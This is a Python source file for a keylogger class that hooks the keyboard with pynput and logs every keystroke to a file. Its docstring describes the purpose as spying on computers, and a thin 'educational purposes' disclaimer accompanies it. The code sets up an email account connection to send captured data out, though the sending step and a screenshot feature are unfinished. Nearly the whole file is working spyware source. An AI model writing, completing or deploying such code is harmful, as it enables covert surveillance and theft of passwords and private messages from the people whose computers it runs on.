from pynput.keyboard import Key, Listener # used to listen to keystrokes
import logging, time, yagmail  # import used to log, get elapsed time, and send emails
from logging.handlers import TimedRotatingFileHandler # used to rotate logs 


class KeyLogger:
    """
    Class used to track keystrokes and spy on computers using screenshots
    <!This is solely for educational purposes!>
        
    KeyLogger used to track keystrokes on keyboards
    to_email: email being sent to by logger
    log_email: loggers email account
    mem: string buffer to minimize logging writeouts
    start_time: time of the current logging cycle
    """
    def __init__(self, email="default@gmail.com", log_dir=""):
        self.to_email = email
        self.log_email = "@gmail.com"
        self.mem = []
        self.start_time = time.time()
        yag = yagmail.SMTP(self.log_email)
        logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.INFO, format='%(asctime)s: %(message)s')

    def run_keylogger(self):
        """
        Runs keylogger. key_log.txt will be updated every 10 seconds and 
        """
        with Listener(on_press=self.__on_press) as listener:
            try:
                listener.join()
            except Exception:
                print("Threading error")

    def __screenshot(self):
        """
        Takes screenshot of computer
        """
        # TODO takes a screenshot of the persons screen
        return None
        
    def __on_press(self, key):
        """
        Action taken on keyboard press
        """
        self.mem.append(str(key))
        # log the data, update time and flush buffer
        if self.__decide_flush(key):
            logging.info("".join(self.mem))
            self.mem.clear() 
            self.start_time = time.time()
    
    def __decide_flush(self, key):
        """
        private function used to decide if appropriate to flush buffer
        """
        return True if time.time() - self.start_time >= 10.0 else False
    
